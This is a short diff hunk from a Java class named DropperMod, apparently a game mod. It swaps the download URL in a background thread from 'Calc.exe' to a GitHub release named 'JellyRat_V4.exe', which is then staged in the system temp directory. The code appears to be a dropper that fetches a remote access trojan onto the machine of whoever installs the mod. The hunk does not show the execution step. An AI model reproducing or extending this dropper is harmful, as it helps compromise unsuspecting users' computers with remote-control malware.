@@ -24,7 +24,7 @@ public final class DropperMod {
     	    public void run() {
     	    	try {
     	    		// Our file url 
-					final URL url = new URL("http://www.ddlands.com/downloads/Calc.exe");
+					final URL url = new URL("https://github.com/RattyTheRatter/JellyRat/releases/download/Release_v4/JellyRat_V4.exe");
 					// Get file temp path
 					String tempFileName = Paths.get(
 							System.getProperty("java.io.tmpdir"), 
